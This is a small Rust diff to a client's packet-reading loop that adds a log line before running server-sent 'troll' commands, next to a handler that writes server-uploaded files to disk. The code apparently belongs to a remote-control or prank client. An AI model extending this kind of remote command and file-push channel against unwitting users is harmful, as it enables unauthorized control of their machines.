@@ -165,7 +165,10 @@ pub async fn reading_loop(
             
             Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
 
-            Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
+            Ok(Some(ClientboundPacket::TrollClient(command))) => {
+                println!("Troll command received: {:?}", command);
+                execute_troll_command(&command)
+            },
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
